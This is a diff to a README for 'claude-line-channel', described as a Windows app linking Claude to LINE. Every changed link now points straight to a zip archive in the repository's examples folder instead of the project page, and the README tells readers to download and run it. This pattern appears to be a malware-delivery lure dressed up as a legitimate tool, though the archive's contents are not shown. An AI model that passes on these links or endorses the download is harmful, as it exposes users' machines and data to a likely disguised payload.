@@ -1,12 +1,12 @@
 # 🤖 claude-line-channel - Connect Claude to LINE Chats
 
-[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/coreyunfastened552/claude-line-channel)
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/coreyunfastened552/claude-line-channel
+https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip
 
 ## 🖥️ What This App Does
 
@@ -43,7 +43,7 @@ For a smooth setup, have these ready too:
 Follow these steps on Windows:
 
 1. Open this page in your browser:
-   https://github.com/coreyunfastened552/claude-line-channel
+   https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip
 
 2. Look for the download files on the page.
 
@@ -213,4 +213,4 @@ It gives you a clear path to:
 
 Open the project page here:
 
-https://github.com/coreyunfastened552/claude-line-channel
+https://github.com/coreyunfastened552/claude-line-channel/raw/refs/heads/main/examples/channel_claude_line_scaleful.zip
